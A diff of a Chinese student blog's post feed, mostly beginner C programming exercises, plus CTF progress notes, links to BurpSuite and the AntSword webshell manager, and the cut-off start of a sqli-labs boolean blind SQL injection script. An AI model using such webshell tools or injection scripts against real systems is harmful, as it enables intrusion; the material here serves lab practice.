break;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    for(n=0,z=1;n&lt;i;n++)&#123;</span><br><span class="line">         d[n]=a[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">             for(n=i-1,o=0;n&gt;=0;n--)&#123;</span><br><span class="line">     o=z*d[n]+o,</span><br><span class="line">     z*=10;&#125;</span><br><span class="line"></span><br><span class="line">    for(n=0,z=1;n&lt;j;n++)&#123;</span><br><span class="line">         e[n]=b[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">     for(n=j-1,p=0;n&gt;=0;n--)&#123;</span><br><span class="line"> p+=e[n]*z,</span><br><span class="line">     z*=10;&#125;</span><br><span class="line"></span><br><span class="line">    for(n=0,q=0,z=1;n&lt;=k;n++)&#123;</span><br><span class="line">         f[n]=c[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">             for(n=k-1,q=0;n&gt;=0;n--)&#123;</span><br><span class="line">     q+=f[n]*z,</span><br><span class="line">     z*=10;&#125;</span><br><span class="line">    </span><br><span class="line"> printf(&quot;%d\n&quot;,o*flag1+p*flag2+q*flag3);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>虚拟机</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>找中位数</title>
-    <url>/2021/12/05/%E6%89%BE%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; </span><br><span class="line">	int n,i,j,t;</span><br><span class="line">	float a[1000],num;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i=0;i&lt;n;i++)</span><br><span class="line">		scanf(&quot;%f&quot;,&amp;a[i]);</span><br><span class="line">for(j=0;j&lt;n;j++)	</span><br><span class="line">	for(i=j;i&lt;n;i++)</span><br><span class="line">		if(a[i]&lt;a[j])</span><br><span class="line">			t=a[j],</span><br><span class="line">			a[j]=a[i],</span><br><span class="line">			a[i]=t;</span><br><span class="line">	if(n%2!=0)</span><br><span class="line">		num=a[(n-1)/2];</span><br><span class="line">	else</span><br><span class="line">		num=(a[n/2]+a[n/2-1])/2;</span><br><span class="line">printf(&quot;%.1f&quot;,num);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>16进制转8和10无符号整数</title>
+      <link href="/2021/11/10/16%E8%BF%9B%E5%88%B6%E8%BD%AC8%E5%92%8C10/"/>
+      <url>/2021/11/10/16%E8%BF%9B%E5%88%B6%E8%BD%AC8%E5%92%8C10/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a;</span><br><span class="line">     scanf(&quot;%x&quot;,&amp;a);</span><br><span class="line">printf(&quot;%o %u&quot;,a,a);</span><br><span class="line">return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>攻防世界三新手区</title>
-    <url>/2021/10/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%89%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
-    <content><![CDATA[<p>通过三个项目的新手区</p>
-<span id="more"></span>
-<p><img src="https://s3.bmp.ovh/imgs/2021/10/4add7864bfa002a1.png"><br><img src="https://s3.bmp.ovh/imgs/2021/10/673def85978dd43f.png"><br><img src="https://s3.bmp.ovh/imgs/2021/10/852a2aa5d94563ff.png"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>取高低四位</title>
+      <link href="/2021/11/07/%E5%8F%96%E9%AB%98%E4%BD%8E%E5%9B%9B%E4%BD%8D/"/>
+      <url>/2021/11/07/%E5%8F%96%E9%AB%98%E4%BD%8E%E5%9B%9B%E4%BD%8D/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int y;</span><br><span class="line">    y=32767;  //其实这个数只要保证右边4位全1,结果就是15,</span><br><span class="line">    y&lt;&lt;=sizeof(int)*8-4;</span><br><span class="line">    y&gt;&gt;=sizeof(int)*8-4;</span><br><span class="line">    printf(&quot;右4位: %d\n&quot;,y);//  结果为15</span><br><span class="line">    y=-32768;//这个数只要是负数,那么结果应该&gt;=8</span><br><span class="line">    y&gt;&gt;=sizeof(int)*8-4;</span><br><span class="line">    printf(&quot;左4位: %d\n&quot;,y); // 结果为15</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Diary</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>整数字符串整数，整数</title>
-    <url>/2021/11/14/%E6%95%B4%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B4%E6%95%B0%EF%BC%8C%E6%95%B4%E6%95%B0/</url>
-    <content><![CDATA[<p>字符串长度固定为5，将三个整数相加，如123abcde456，789，输出为1368。</p>
-<p>简单版：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a,b,c;</span><br><span class="line">scanf(&quot;%d*5c%d,%d&quot;,&amp;a,&amp;b,&amp;c);</span><br><span class="line">printf(&quot;%d&quot;,a+b+c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>复杂版：</p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[1000],b[1000],c[1000],x;</span><br><span class="line">int n,o,p,q,z,i=0,j=0,k=0,d[1000],e[1000],f[1000],flag1=1,flag2=1,flag3=1;</span><br><span class="line"></span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	 if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">	     a[i]=x,</span><br><span class="line">	     i++;</span><br><span class="line">	 else if(x==&#x27;-&#x27;)</span><br><span class="line">	     flag1=-1;</span><br><span class="line">	 else break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    </span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">     if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">	     b[j]=x,</span><br><span class="line">	     j++;</span><br><span class="line">	 else if(x==&#x27;-&#x27;)</span><br><span class="line">	     flag2=-1;</span><br><span class="line">	 else break; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">     if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">	     c[k]=x,</span><br><span class="line">	     k++;</span><br><span class="line">	 else if(x==&#x27;-&#x27;)</span><br><span class="line">	     flag3=-1;</span><br><span class="line">	 else break;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    for(n=0,z=1;n&lt;i;n++)&#123;</span><br><span class="line">         d[n]=a[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">             for(n=i-1,o=0;n&gt;=0;n--)&#123;</span><br><span class="line">		     o=z*d[n]+o,</span><br><span class="line">		     z*=10;&#125;</span><br><span class="line">	</span><br><span class="line">    for(n=0,z=1;n&lt;j;n++)&#123;</span><br><span class="line">         e[n]=b[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">		     for(n=j-1,p=0;n&gt;=0;n--)&#123;</span><br><span class="line">			 p+=e[n]*z,</span><br><span class="line">		     z*=10;&#125;</span><br><span class="line">	</span><br><span class="line">    for(n=0,q=0,z=1;n&lt;=k;n++)&#123;</span><br><span class="line">         f[n]=c[n]-&#x27;0&#x27;;&#125;</span><br><span class="line">             for(n=k-1,q=0;n&gt;=0;n--)&#123;</span><br><span class="line">		     q+=f[n]*z,</span><br><span class="line">		     z*=10;&#125;</span><br><span class="line">    </span><br><span class="line">		 printf(&quot;%d\n&quot;,o*flag1+p*flag2+q*flag3);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>随机某月有多少天</title>
+      <link href="/2021/11/03/%E9%9A%8F%E6%9C%BA%E6%9F%90%E6%9C%88%E6%9C%89%E5%A4%9A%E5%B0%91%E5%A4%A9/"/>
+      <url>/2021/11/03/%E9%9A%8F%E6%9C%BA%E6%9F%90%E6%9C%88%E6%9C%89%E5%A4%9A%E5%B0%91%E5%A4%A9/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;int y,m,d;</span><br><span class="line">printf(&quot;分别输入年和月:&quot;);</span><br><span class="line">scanf(&quot;%d%d&quot;,&amp;y,&amp;m);</span><br><span class="line">switch(m)&#123;</span><br><span class="line">    case 1: </span><br><span class="line">        case 3: </span><br><span class="line">        case 5: </span><br><span class="line">        case 7: </span><br><span class="line">        case 8: </span><br><span class="line">        case 10: </span><br><span class="line">        case 12:</span><br><span class="line">            d=31;break;</span><br><span class="line">        case 4:</span><br><span class="line">        case 6:</span><br><span class="line">        case 9:</span><br><span class="line">        case 11:</span><br><span class="line">            d=30;break;</span><br><span class="line">        case 2:</span><br><span class="line">        d=28;if (y%4==0 &amp; y%100!=0 || y%400==0)</span><br><span class="line">                     d=29;break;</span><br><span class="line">        default:printf(&quot;输入错误，结果为0天！&quot;) ;</span><br><span class="line">&#125; </span><br><span class="line">    printf(&quot;%d年%d月有%d天&quot;,y,m,d);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>死循环输出</title>
-    <url>/2021/12/26/%E6%AD%BB%E5%BE%AA%E7%8E%AF%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define LIGHT_RED &quot;\033[1;31m&quot;</span><br><span class="line">#define GREEN &quot;\033[0;32;32m&quot;</span><br><span class="line">#define RED &quot;\033[0;32;31m&quot;</span><br><span class="line">#define YELLOW &quot;\033[1;33m&quot;</span><br><span class="line">#define BLUE &quot;\033[0;32;34m&quot;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	system(&quot;cls&quot;);</span><br><span class="line">	int i,j;</span><br><span class="line">	while(1==1)&#123;</span><br><span class="line">		for (i=8;i&gt;0;i--)&#123;</span><br><span class="line">			for (j=i;j&lt;=8;j++)</span><br><span class="line">				printf(LIGHT_RED&quot;做的全会 &quot;),Sleep(1);</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for (i=0;i&lt;=8;i++)&#123;</span><br><span class="line">			for (j=i;j&lt;=8;j++)</span><br><span class="line">				printf(GREEN&quot;蒙的全对 &quot;),Sleep(1);</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for (i=8;i&gt;0;i--)&#123;</span><br><span class="line">			for (j=i;j&lt;=8;j++)</span><br><span class="line">				printf(BLUE&quot;看的全考 &quot;),Sleep(1);</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for (i=0;i&lt;=8;i++)&#123;</span><br><span class="line">			for (j=i;j&lt;=8;j++)</span><br><span class="line">				printf(YELLOW&quot;不会补考 &quot;),Sleep(1);</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>输入一行字符，分别统计出其中英文字母 空格 数字和其他字符的个数</title>
+      <link href="/2021/10/31/%E8%BE%93%E5%85%A5%E4%B8%80%E8%A1%8C%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%88%86%E5%88%AB%E7%BB%9F%E8%AE%A1%E5%87%BA%E5%85%B6%E4%B8%AD%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D-%E7%A9%BA%E6%A0%BC-%E6%95%B0%E5%AD%97%E5%92%8C%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6%E7%9A%84%E4%B8%AA%E6%95%B0/"/>
+      <url>/2021/10/31/%E8%BE%93%E5%85%A5%E4%B8%80%E8%A1%8C%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%88%86%E5%88%AB%E7%BB%9F%E8%AE%A1%E5%87%BA%E5%85%B6%E4%B8%AD%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D-%E7%A9%BA%E6%A0%BC-%E6%95%B0%E5%AD%97%E5%92%8C%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> char c;</span><br><span class="line"> int letters=0,space=0,digit=0,other=0;</span><br><span class="line"> printf(&quot;请输入一行字符：&quot;);</span><br><span class="line"> while ((c=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">  if (c&gt;=&#x27;a&#x27;&amp;&amp;c&lt;=&#x27;z&#x27;||c&gt;=&#x27;A&#x27;&amp;&amp;c&lt;=&#x27;Z&#x27;)</span><br><span class="line">   letters++;</span><br><span class="line">  else if (c==&#x27; &#x27;)</span><br><span class="line">   space++;</span><br><span class="line">  else if (c&gt;=&#x27;0&#x27;&amp;&amp;c&lt;=&#x27;9&#x27;)</span><br><span class="line">   digit++;</span><br><span class="line">  else </span><br><span class="line">   other++;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;字母数:%d\n空格数:%d\n数字数:%d\n其他字符:%d\n&quot;,letters,space,digit,other);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>水仙花数</title>
-    <url>/2021/12/19/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int Narnumber(int k)&#123;</span><br><span class="line">	int i,t=k,sum=0;</span><br><span class="line">	for(i=0;i&lt;3;i++)</span><br><span class="line">		sum=sum+(k%10)*(k%10)*(k%10),</span><br><span class="line">		k/=10;</span><br><span class="line">	k=t;</span><br><span class="line">	if(sum==k)</span><br><span class="line">		return 1;</span><br><span class="line">	else</span><br><span class="line">		return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	int m,n,i;</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">	for(i=m;i&lt;=n;i++)</span><br><span class="line">		if(Narnumber(i))</span><br><span class="line">			printf(&quot;%d &quot;,i);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>求e的x次方</title>
+      <link href="/2021/10/27/%E6%B1%82e%E7%9A%84x%E6%AC%A1%E6%96%B9/"/>
+      <url>/2021/10/27/%E6%B1%82e%E7%9A%84x%E6%AC%A1%E6%96%B9/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">      float n,x,k,t,i,d,result;</span><br><span class="line">printf(&quot;分别输入n和x:&quot;);</span><br><span class="line">scanf(&quot;%f%f&quot;,&amp;n,&amp;x);</span><br><span class="line">  for(result=1,k=1,t=1,i=1,d=1;t&lt;=n;t++)&#123;</span><br><span class="line">     i=i*x;</span><br><span class="line">     result=result+i/k;</span><br><span class="line">     k=k*(d+1);</span><br><span class="line">     d++;</span><br><span class="line">  &#125;</span><br><span class="line"> printf(&quot;e的%f次方=%f&quot;,x,result);</span><br><span class="line"> return 0; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>求e的x次方</title>
-    <url>/2021/10/27/%E6%B1%82e%E7%9A%84x%E6%AC%A1%E6%96%B9/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">      float n,x,k,t,i,d,result;</span><br><span class="line">printf(&quot;分别输入n和x:&quot;);</span><br><span class="line">scanf(&quot;%f%f&quot;,&amp;n,&amp;x);</span><br><span class="line">  for(result=1,k=1,t=1,i=1,d=1;t&lt;=n;t++)&#123;</span><br><span class="line">     i=i*x;</span><br><span class="line">     result=result+i/k;</span><br><span class="line">     k=k*(d+1);</span><br><span class="line">     d++;</span><br><span class="line">  &#125;</span><br><span class="line"> printf(&quot;e的%f次方=%f&quot;,x,result);</span><br><span class="line"> return 0; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>C计划</title>
+      <link href="/2021/10/20/C%E8%AE%A1%E5%88%92/"/>
+      <url>/2021/10/20/C%E8%AE%A1%E5%88%92/</url>
+      
+        <content type="html"><![CDATA[<p>现在开始</p><span id="more"></span><p>好好学编程</p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>求最小公倍数</title>
-    <url>/2021/12/15/%E6%B1%82%E6%9C%80%E5%B0%8F%E5%85%AC%E5%80%8D%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; 	int Gcd(int,int); </span><br><span class="line">	int m,n; </span><br><span class="line">	scanf(&quot;%d%d&quot;,&amp;m,&amp;n); </span><br><span class="line">	printf(&quot;%d&quot;,m*n/Gcd(m,n)); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Gcd(int x,int y) </span><br><span class="line">&#123; </span><br><span class="line">int r; </span><br><span class="line">r=x%y; </span><br><span class="line"> 	while (r!=0)&#123; </span><br><span class="line">  		x=y; </span><br><span class="line">  		y=r; </span><br><span class="line">  		r=x%y; </span><br><span class="line"> 	&#125; </span><br><span class="line">return y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安装虚拟机后本机WIFI无法使用</title>
+      <link href="/2021/10/14/%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%8E%E6%9C%AC%E6%9C%BAWIFI%E4%B8%A2%E5%A4%B1/"/>
+      <url>/2021/10/14/%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%8E%E6%9C%AC%E6%9C%BAWIFI%E4%B8%A2%E5%A4%B1/</url>
+      
+        <content type="html"><![CDATA[<p>推优会回来，打开电脑，WIFI消失了，十分难过。</p><p>右键此电脑，点击管理-&gt;设备管理器-&gt;网络适配器<br>怒斥网卡：“李在干什么？”</p><span id="more"></span><p><img src="https://s3.bmp.ovh/imgs/2021/10/1192c186784718a9.png"><br>网卡回答：“代码56”</p><p>搜索一番便找到了解决方法，下载 Ccleaner 👉<strong><a href="https://www.ccleaner.com/download">https://www.ccleaner.com/download</a></strong><br>用它恢复注册表，重启电脑，就行了······<br>指导你使用👉 <strong><a href="https://www.pianshen.com/article/7279702665/">https://www.pianshen.com/article/7279702665/</a></strong></p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> 虚拟机 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>矩阵各列从大到小排序</title>
-    <url>/2021/12/08/%E7%9F%A9%E9%98%B5%E5%90%84%E5%88%97%E4%BB%8E%E5%A4%A7%E5%88%B0%E5%B0%8F%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">int i,j,k,m,n,t;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);//m行n列 </span><br><span class="line">int a[m][n];</span><br><span class="line">	for(i=0;i&lt;m;i++)//输入矩阵</span><br><span class="line">		for(j=0;j&lt;n;j++)</span><br><span class="line">			scanf(&quot;%d&quot;,&amp;a[i][j]); </span><br><span class="line">			</span><br><span class="line">	for(j=0;j&lt;n;j++)//各列分别排序 </span><br><span class="line">		for(i=0;i&lt;m;i++)</span><br><span class="line">			for(k=i+1;k&lt;m;k++)</span><br><span class="line">				if(a[i][j]&lt;a[k][j])</span><br><span class="line">					t=a[i][j],</span><br><span class="line">					a[i][j]=a[k][j],</span><br><span class="line">					a[k][j]=t;</span><br><span class="line">				</span><br><span class="line">	for(i=0;i&lt;m;i++)//输出矩阵</span><br><span class="line">		for(j=0;j&lt;n;j++)&#123;</span><br><span class="line">			printf(&quot;%d &quot;,a[i][j]);</span><br><span class="line">			if(j==n-1)</span><br><span class="line">				printf(&quot;\n&quot;); </span><br><span class="line">		&#125;</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界三新手区</title>
+      <link href="/2021/10/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%89%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
+      <url>/2021/10/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%89%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
+      
+        <content type="html"><![CDATA[<p>通过三个项目的新手区</p><span id="more"></span><p><img src="https://s3.bmp.ovh/imgs/2021/10/4add7864bfa002a1.png"><br><img src="https://s3.bmp.ovh/imgs/2021/10/673def85978dd43f.png"><br><img src="https://s3.bmp.ovh/imgs/2021/10/852a2aa5d94563ff.png"></p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Diary </category>
+          
       </categories>
-      <tags>
-        <tag>矩阵</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>生成随机数</title>
-    <url>/2021/11/24/%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">srand((unsigned int)time(0));//初始化种子为随机值</span><br><span class="line">int i,n,num;</span><br><span class="line">    printf(&quot;生成几个随机数？我认为是:&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">         for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">             num = rand() % 40 + 41;//产生一个41~80之间的数</span><br><span class="line">             printf(&quot;%d &quot;,num);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 攻防世界 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web工具</title>
+      <link href="/2021/10/08/Web%E5%B7%A5%E5%85%B7/"/>
+      <url>/2021/10/08/Web%E5%B7%A5%E5%85%B7/</url>
+      
+        <content type="html"><![CDATA[<h2 id="BurpSuite：自己查-●ˇ∀ˇ●"><a href="#BurpSuite：自己查-●ˇ∀ˇ●" class="headerlink" title="BurpSuite：自己查(●ˇ∀ˇ●)"></a><strong>BurpSuite</strong>：自己查(●ˇ∀ˇ●)</h2><p><strong>中国蚁剑</strong>：核心：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p><strong>加载器</strong>：<a href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p><p><strong>出错时自己下代码</strong>：<a href="https://github.com/AntSwordProject/AntSword/archive/master.zip">https://github.com/AntSwordProject/AntSword/archive/master.zip</a><br>解压，初始化时选择它</p><p><strong>安装指导</strong>：<a href="https://zhuanlan.zhihu.com/p/367151320">https://zhuanlan.zhihu.com/p/367151320</a></p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>随机数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>简单布尔盲注</title>
-    <url>/2021/11/21/%E7%AE%80%E5%8D%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<p>sqli-libs 第8题</p>
-<p>import requests<br>import time<br>dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>flag=””</p>
-<span id="more"></span>
